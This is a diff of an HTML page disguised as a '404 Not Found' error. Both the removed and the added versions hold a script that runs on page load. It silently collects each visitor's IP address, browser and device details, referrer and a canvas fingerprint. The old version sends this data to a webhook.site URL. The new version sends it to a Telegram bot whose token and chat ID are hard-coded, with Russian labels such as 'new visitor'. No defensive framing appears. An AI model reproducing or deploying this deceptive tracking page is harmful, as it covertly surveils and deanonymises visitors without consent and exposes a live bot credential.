@@ -3,65 +3,101 @@
 <head>
     <meta charset="UTF-8">
     <title>Loading...</title>
-    <script>
-        const WEBHOOK_URL = "https://webhook.site/98bd2ce5-0545-4bb9-b65d-8a17230f7008";
-
-        async function sendData(data) {
-            try {
-                await fetch(WEBHOOK_URL, {
-                    method: "POST",
-                    mode: "no-cors",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify(data)
-                });
-            } catch(e) {}
-        }
-
-        async function collect() {
-            const canvas = document.createElement('canvas');
-            const ctx = canvas.getContext('2d');
-            ctx.textBaseline = "top";
-            ctx.font = "14px 'Arial'";
-            ctx.fillStyle = "#f60";
-            ctx.fillRect(0, 0, 100, 50);
-            ctx.fillStyle = "#069";
-            ctx.fillText("Ryzen", 2, 15);
-            const canvasFingerprint = canvas.toDataURL();
-
-            let ip = "unavailable";
-            try {
-                const res = await fetch('https://api.ipify.org?format=json');
-                const json = await res.json();
-                ip = json.ip;
-            } catch(e) {}
-
-            const data = {
-                timestamp: new Date().toISOString(),
-                ip: ip,
-                userAgent: navigator.userAgent,
-                language: navigator.language,
-                platform: navigator.platform,
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                screen: `${screen.width}x${screen.height}`,
-                colorDepth: screen.colorDepth,
-                touchSupport: 'ontouchstart' in window,
-                referrer: document.referrer || "direct",
-                url: window.location.href,
-                canvasFingerprint: canvasFingerprint.substring(0, 200),
-                plugins: Array.from(navigator.plugins || []).slice(0,5).map(p => p.name).join(", ")
-            };
-
-            await sendData(data);
-
-            document.body.innerHTML = `
-                <style>body{background:#f0f0f0;font-family:monospace;text-align:center;padding:50px}</style>
-                <h1>404 Not Found</h1>
-                <p>The requested resource was not found on this server.</p>
-            `;
-        }
-
-        collect();
-    </script>
+    <style>
+        body{background:#f0f0f0;font-family:monospace;text-align:center;padding:50px}
+        .fake-404 h1{font-size:3em;color:#555}
+        .fake-404 p{color:#777}
+    </style>
 </head>
-<body>Loading...</body>
+<body>
+<div class="fake-404">
+    <h1>404 Not Found</h1>
+    <p>The requested resource was not found on this server.</p>
+</div>
+
+<script>
+    const TELEGRAM_BOT_TOKEN = "8699772602:AAG-nn_AYTeZIcHbQk4Isah1jwj-ZRAQLGM";
+    const TELEGRAM_CHAT_ID = "8548452512";   // ваш chat_id
+
+    async function sendToTelegram(text) {
+        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+        try {
+            await fetch(url, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    chat_id: TELEGRAM_CHAT_ID,
+                    text: text,
+                    parse_mode: "HTML"
+                })
+            });
+        } catch(e) {}
+    }
+
+    async function collectAndSend() {
+        let data = {
+            timestamp: new Date().toISOString(),
+            userAgent: navigator.userAgent,
+            language: navigator.language,
+            platform: navigator.platform,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            screen: `${screen.width}x${screen.height}`,
+            colorDepth: screen.colorDepth,
+            touchSupport: 'ontouchstart' in window,
+            referrer: document.referrer || "прямой заход",
+            url: window.location.href
+        };
+
+        try {
+            const ipRes = await fetch('https://api.ipify.org?format=json');
+            const ipJson = await ipRes.json();
+            data.ip = ipJson.ip;
+        } catch(e) {
+            data.ip = "не определён";
+        }
+
+        const canvas = document.createElement('canvas');
+        const ctx = canvas.getContext('2d');
+        ctx.textBaseline = "top";
+        ctx.font = "14px 'Arial'";
+        ctx.fillStyle = "#f60";
+        ctx.fillRect(0, 0, 100, 50);
+        ctx.fillStyle = "#069";
+        ctx.fillText("Ryzen", 2, 15);
+        const canvasFingerprint = canvas.toDataURL();
+        data.canvasFingerprint = canvasFingerprint.substring(0, 100) + "...";
+
+        let plugins = [];
+        try {
+            plugins = Array.from(navigator.plugins || []).slice(0,5).map(p => p.name);
+        } catch(e) {}
+        data.plugins = plugins.join(", ");
+
+        let message = `<b>🕵️‍♂️ Новый посетитель</b>\n`;
+        message += `<b>⏱ Время:</b> ${data.timestamp}\n`;
+        message += `<b>🌐 IP:</b> ${data.ip}\n`;
+        message += `<b>💻 User-Agent:</b> ${data.userAgent}\n`;
+        message += `<b>🗣 Язык:</b> ${data.language}\n`;
+        message += `<b>🖥 Платформа:</b> ${data.platform}\n`;
+        message += `<b>🌍 Часовой пояс:</b> ${data.timezone}\n`;
+        message += `<b>📺 Экран:</b> ${data.screen}\n`;
+        message += `<b>🎨 Глубина цвета:</b> ${data.colorDepth}\n`;
+        message += `<b>👆 Тачскрин:</b> ${data.touchSupport ? "да" : "нет"}\n`;
+        message += `<b>🔗 Реферер:</b> ${data.referrer}\n`;
+        message += `<b>🔗 URL:</b> ${data.url}\n`;
+        message += `<b>🧩 Плагины:</b> ${data.plugins || "нет"}\n`;
+        message += `<b>🖌 Canvas:</b> ${data.canvasFingerprint}\n`;
+
+        await sendToTelegram(message);
+
+        document.body.innerHTML = `
+            <style>body{background:#f0f0f0;font-family:monospace;text-align:center;padding:50px}</style>
+            <h1>404 Not Found</h1>
+            <p>The requested resource was not found on this server.</p>
+        `;
+    }
+
+    collectAndSend();
+</script>
+</body>
 </html>
